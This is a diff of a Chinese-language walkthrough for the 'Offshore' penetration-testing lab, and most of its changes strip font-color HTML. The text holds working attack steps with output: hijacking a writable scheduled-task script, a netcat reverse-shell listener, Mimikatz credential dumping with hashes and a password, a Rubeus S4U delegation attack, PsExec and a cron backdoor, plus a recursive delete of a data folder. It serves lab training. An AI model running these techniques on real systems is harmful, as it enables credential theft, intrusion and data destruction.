-<font style="color:rgb(13, 13, 13);background-color:rgb(249, 249, 249);">得到凭据 User : Administrator</font>  <font style="color:rgb(13, 13, 13);background-color:rgb(249, 249, 249);">Hash NTLM: 971bc1ac6d2344c4b42107976e0972dc</font>
+得到凭据 User : Administrator  Hash NTLM: 971bc1ac6d2344c4b42107976e0972dc
 
 ## Administrator登录
 ```c
@@ -15323,7 +15324,7 @@ OFFSHORE{w@tch_th3_for3st_burn}
 ```
 
 ## Getflag
-<font style="color:#32373f;">Found a flag in GPO</font>
+Found a flag in GPO
 
 ![](/image/prolabs/Offshore-78.png)
 
@@ -17185,7 +17186,7 @@ forfiles -p "C:\Banking_Data" -s -m *.* /C "cmd /c del @path"
 ![](/image/prolabs/Offshore-85.png)
 
 ### 添加一个本地管理员
-<font style="color:rgb(43, 45, 49);">因为 c:\users\public\downloads\clean.bat 这个文件对普通用户是</font>**<font style="color:rgb(43, 45, 49);">可写</font>**<font style="color:rgb(43, 45, 49);">的，我们只需往里面追加恶意命令，等计划任务触发，就能以clean用户身份执行</font>
+因为 c:\users\public\downloads\clean.bat 这个文件对普通用户是**可写**的，我们只需往里面追加恶意命令，等计划任务触发，就能以clean用户身份执行
 
 ```c
 echo net user pwned Pwned!123 /add >> C:\Users\Public\Downloads\clean.bat
@@ -17214,10 +17215,10 @@ CLIENT\svc_client_sec$
 The command completed successfully.
 ```
 
-没看见pwned用户增加，可能是因为**<font style="color:rgb(43, 45, 49);">UAC (用户账户控制) 与计划任务的完整性级别 (Integrity Level)</font>**<font style="color:rgb(43, 45, 49);">。</font>  
-<font style="color:rgb(43, 45, 49);">虽然 cleaner 是本地管理员组成员，但是这个计划任务在后台运行时，如果没有勾选“以最高权限运行 (Run with highest privileges)”，它默认是以 </font>**<font style="color:rgb(43, 45, 49);">中等完整性级别 (Medium Integrity)</font>**<font style="color:rgb(43, 45, 49);"> 运行的。在这个级别下，它被 UAC 降权了，</font>**<font style="color:rgb(43, 45, 49);">没有权限直接创建用户或修改管理员组</font>**<font style="color:rgb(43, 45, 49);">！</font>
+没看见pwned用户增加，可能是因为**UAC (用户账户控制) 与计划任务的完整性级别 (Integrity Level)**。  
+虽然 cleaner 是本地管理员组成员，但是这个计划任务在后台运行时，如果没有勾选“以最高权限运行 (Run with highest privileges)”，它默认是以 **中等完整性级别 (Medium Integrity)** 运行的。在这个级别下，它被 UAC 降权了，**没有权限直接创建用户或修改管理员组**！
 
-### <font style="color:rgb(43, 45, 49);">反弹shell</font>
+### 反弹shell
 ```c
 nc -lvnp 4444
 ```
@@ -17274,23 +17275,23 @@ The command completed successfully.
 原来之前没添加成功用户也可能是密码和cmd导致的
 
 ## 横向移动
-### <font style="color:rgb(43, 45, 49);">抓取明文密码与机器 Hash (Mimikatz)</font>
-<font style="color:rgb(43, 45, 49);">有了管理员权限，我们就可以为所欲为了。我们需要运行 Mimikatz 从内存中抓取关键凭据。</font>
+### 抓取明文密码与机器 Hash (Mimikatz)
+有了管理员权限，我们就可以为所欲为了。我们需要运行 Mimikatz 从内存中抓取关键凭据。
 
-**<font style="color:rgb(43, 45, 49);">上传并运行 Mimikatz</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">把你的 mimikatz.exe 复制或下载到 MS02（比如放到 C:\Users\Public\ 下）。  
-</font><font style="color:rgb(43, 45, 49);">在刚才高权限的 CMD 里运行它：</font>
+**上传并运行 Mimikatz**  
+把你的 mimikatz.exe 复制或下载到 MS02（比如放到 C:\Users\Public\ 下）。  
+在刚才高权限的 CMD 里运行它：
 
-+ **<font style="color:rgb(28, 27, 27);">Cmd  </font>**
++ **Cmd  **
 
 ```plain
 C:\Users\Public\mimikatz.exe
 ```
 
-**<font style="color:rgb(43, 45, 49);">抓取凭据</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">利用clean账户在 Mimikatz 的提示符 mimikatz # 下依次输入：</font>
+**抓取凭据**  
+利用clean账户在 Mimikatz 的提示符 mimikatz # 下依次输入：
 
-+ **<font style="color:rgb(108, 113, 122);"></font>****<font style="color:rgb(28, 27, 27);">Text  </font>**
++ ******Text  **
 
 ```plain
 privilege::debug
@@ -17637,38 +17638,38 @@ SID               : S-1-5-18
 mimikatz # 
 ```
 
-**<font style="color:rgb(43, 45, 49);">【关键动作】在输出的茫茫多信息中，寻找两个极其重要的东西并记录下来：</font>**
+**【关键动作】在输出的茫茫多信息中，寻找两个极其重要的东西并记录下来：**
 
-    - <font style="color:rgb(43, 45, 49);">找到</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">Username : cleaner</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">的部分，记录下它的明文密码：</font><font style="color:rgb(43, 45, 49);">Cleanup_Cleanup!</font><font style="color:rgb(43, 45, 49);">。</font>
-    - <font style="color:rgb(43, 45, 49);">找到</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">Username : MS02$</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">(注意有个美元符号，这是</font>**<font style="color:rgb(43, 45, 49);">机器账户</font>**<font style="color:rgb(43, 45, 49);">) 的部分，记录下它的</font><font style="color:rgb(43, 45, 49);"> </font>**<font style="color:rgb(43, 45, 49);">NTLM Hash</font>**<font style="color:rgb(43, 45, 49);">（根据 WP，应该是</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">dc7a49c0c36399ae87f3de623ebab985</font><font style="color:rgb(43, 45, 49);">）。</font>
+    - 找到 Username : cleaner 的部分，记录下它的明文密码：Cleanup_Cleanup!。
+    - 找到 Username : MS02$ (注意有个美元符号，这是**机器账户**) 的部分，记录下它的 **NTLM Hash**（根据 WP，应该是 dc7a49c0c36399ae87f3de623ebab985）。
 
 ---
 
 ![](/image/prolabs/Offshore-87.png)
 
-### <font style="color:rgb(43, 45, 49);">利用约束性委派打下 DC04 (S4U Attack)</font>
-**<font style="color:rgb(43, 45, 49);">原理科普</font>**<font style="color:rgb(43, 45, 49);">：在活动目录中，机器</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">MS02</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">被配置了</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">AllowedToDelegate</font><font style="color:rgb(43, 45, 49);">（允许委派）给</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">DC04</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">的</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">cifs</font><font style="color:rgb(43, 45, 49);">（文件共享）服务。这意味着，如果我们掌握了</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">MS02$</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">机器账户的 Hash，我们就能“假传圣旨”，伪造任何用户（比如 Domain Admin</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">administrator</font><font style="color:rgb(43, 45, 49);">）的身份去访问 DC04。</font>
+### 利用约束性委派打下 DC04 (S4U Attack)
+**原理科普**：在活动目录中，机器 MS02 被配置了 AllowedToDelegate（允许委派）给 DC04 的 cifs（文件共享）服务。这意味着，如果我们掌握了 MS02$ 机器账户的 Hash，我们就能“假传圣旨”，伪造任何用户（比如 Domain Admin administrator）的身份去访问 DC04。
 
-+ **<font style="color:rgb(43, 45, 49);">上传 Rubeus 工具</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">把</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">Rubeus.exe</font><font style="color:rgb(43, 45, 49);">（专搞 Kerberos 票据的神器）传到 MS02 上（放到</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">C:\Users\Public\</font><font style="color:rgb(43, 45, 49);">）。</font>
++ **上传 Rubeus 工具**  
+把 Rubeus.exe（专搞 Kerberos 票据的神器）传到 MS02 上（放到 C:\Users\Public\）。
 
-**<font style="color:rgb(43, 45, 49);">发起 S4U 攻击（申请伪造票据）</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">在</font>**<font style="color:rgb(43, 45, 49);">高权限</font>**<font style="color:rgb(43, 45, 49);">的 CMD 中（或者重新开一个 powershell），执行以下命令：</font><font style="color:rgb(43, 45, 49);">  
-</font>_<font style="color:rgb(43, 45, 49);">(注意替换其中的 Hash 为你刚才抓到的</font>__<font style="color:rgb(43, 45, 49);"> </font>__<font style="color:rgb(43, 45, 49);">MS02$</font>__<font style="color:rgb(43, 45, 49);"> </font>__<font style="color:rgb(43, 45, 49);">的 Hash)</font>_
+**发起 S4U 攻击（申请伪造票据）**  
+在**高权限**的 CMD 中（或者重新开一个 powershell），执行以下命令：  
+_(注意替换其中的 Hash 为你刚才抓到的__ __MS02$__ __的 Hash)_
 
-+ **<font style="color:rgb(28, 27, 27);">Cmd </font>**
++ **Cmd **
 
 ```plain
 C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /ptt
 ```
 
-**<font style="color:rgb(43, 45, 49);">参数解析：</font>****<font style="color:rgb(43, 45, 49);">  </font>****<font style="color:rgb(43, 45, 49);">参数分析：</font>**
+**参数解析：****  ****参数分析：**
 
-    - <font style="color:rgb(43, 45, 49);">/rc4</font><font style="color:rgb(43, 45, 49);">：我们使用机器账户的 NTLM hash 来认证。</font>
-    - <font style="color:rgb(43, 45, 49);">/impersonateuser:administrator</font><font style="color:rgb(43, 45, 49);">：我们要伪装成域管 administrator。</font><font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">/impersonateuser：administrator</font><font style="color:rgb(43, 45, 49);">：我们要伪装成域管 administrator。</font>
-    - <font style="color:rgb(43, 45, 49);">/msdsspn</font><font style="color:rgb(43, 45, 49);">：我们要访问的目标服务（DC04的cifs）。</font>
-    - <font style="color:rgb(43, 45, 49);">/ptt</font><font style="color:rgb(43, 45, 49);">：Pass-The-Ticket，把伪造好的票据直接注入到当前的内存会话中。</font>
+    - /rc4：我们使用机器账户的 NTLM hash 来认证。
+    - /impersonateuser:administrator：我们要伪装成域管 administrator。  
+/impersonateuser：administrator：我们要伪装成域管 administrator。
+    - /msdsspn：我们要访问的目标服务（DC04的cifs）。
+    - /ptt：Pass-The-Ticket，把伪造好的票据直接注入到当前的内存会话中。
 
 ```c
 C:\Windows\system32>C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /ptt
@@ -17795,16 +17796,16 @@ C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985
 [+] Ticket successfully imported!
 ```
 
-**<font style="color:rgb(43, 45, 49);">验证并获取 DC04 的 Flag</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">在这个</font>**<font style="color:rgb(43, 45, 49);">已经注入了票据</font>**<font style="color:rgb(43, 45, 49);">的 CMD 窗口中，直接访问 DC04 的 C 盘隐藏共享：</font>
+**验证并获取 DC04 的 Flag**  
+在这个**已经注入了票据**的 CMD 窗口中，直接访问 DC04 的 C 盘隐藏共享：
 
-+ **<font style="color:rgb(28, 27, 27);">Cmd </font>**
++ **Cmd **
 
 ```plain
 dir \\DC04.CLIENT.OFFSHORE.COM\c$
 ```
 
-<font style="color:rgb(43, 45, 49);">能列出目录，说明拿下了！</font>
+能列出目录，说明拿下了！
 
 ```c
 C:\Windows\system32>dir \\DC04.CLIENT.OFFSHORE.COM\c$
@@ -17824,7 +17825,7 @@ dir \\DC04.CLIENT.OFFSHORE.COM\c$
                6 Dir(s)  15,851,720,704 bytes free
 ```
 
-## <font style="color:rgb(43, 45, 49);">Mimikatz上传</font>
+## Mimikatz上传
 ```c
 C:\Windows\system32>pushd \\DC04.CLIENT.OFFSHORE.COM\c$\users\
 pushd \\DC04.CLIENT.OFFSHORE.COM\c$\users\
@@ -17852,30 +17853,30 @@ mimikatz #
 
 `pushd` 会自动：
 
-1. <font style="color:rgb(43, 45, 49);">映射一个临时盘符（比如 </font>`<font style="color:rgb(43, 45, 49);">Z:</font>`<font style="color:rgb(43, 45, 49);">）</font>
-2. <font style="color:rgb(43, 45, 49);">进入该目录</font>
-3. <font style="color:rgb(43, 45, 49);">输入 popd  即可恢复</font>
+1. 映射一个临时盘符（比如 `Z:`）
+2. 进入该目录
+3. 输入 popd  即可恢复
 
-## <font style="color:rgb(28, 27, 27);">Getlag</font>
+## Getlag
 ```c
 C:\Windows\system32>type \\DC04.CLIENT.OFFSHORE.COM\c$\users\administrator\desktop\flag.txt
 type \\DC04.CLIENT.OFFSHORE.COM\c$\users\administrator\desktop\flag.txt
 OFFSHORE{c@r3ful_who_y0u_d3legate_t0}
 ```
 
-**<font style="color:rgb(43, 45, 49);">获取 DC04 交互式 Shell (选做)</font>**<font style="color:rgb(43, 45, 49);">  
-</font><font style="color:rgb(43, 45, 49);">如果你想要一个 DC04 的完整 Shell，将 Sysinternals 的</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">PsExec64.exe</font><font style="color:rgb(43, 45, 49);"> </font><font style="color:rgb(43, 45, 49);">上传到 MS02，然后执行：</font>
+**获取 DC04 交互式 Shell (选做)**  
+如果你想要一个 DC04 的完整 Shell，将 Sysinternals 的 PsExec64.exe 上传到 MS02，然后执行：
 
-+ **<font style="color:rgb(28, 27, 27);">Cmd</font>**
++ **Cmd**
 
 ```plain
 C:\Users\Public\PsExec64.exe -accepteula \\DC04.CLIENT.OFFSHORE.COM cmd.exe
 ```
 
-<font style="color:rgb(43, 45, 49);">弹出的新窗口就是 DC04 的 NT AUTHORITY\SYSTEM 权限 Shell 了！</font>
+弹出的新窗口就是 DC04 的 NT AUTHORITY\SYSTEM 权限 Shell 了！
 
-## <font style="color:rgb(43, 45, 49);">Kali利用</font>
-### <font style="color:rgb(43, 45, 49);">导出票据</font>
+## Kali利用
+### 导出票据
 ```c
 C:\Users\Public\Rubeus.exe s4u /user:MS02$ /rc4:dc7a49c0c36399ae87f3de623ebab985 /impersonateuser:administrator /msdsspn:"cifs/DC04.CLIENT.OFFSHORE.COM" /altservice:cifs /outfile:client_dc04.kirbi
 
@@ -18842,7 +18843,7 @@ echo '* * * * *       root    /tmp/rootme.sh' >> crontab.in
 
 剩下要做的就是在我们的攻击者机器上启动一个 netcat 监听器，然后等待 root shell 进入。
 
-结果发现没成功，原因是<font style="color:rgb(51, 51, 51);">需要一个完整的shell</font>
+结果发现没成功，原因是需要一个完整的shell
 
 ### 构建完整shell
 ```c
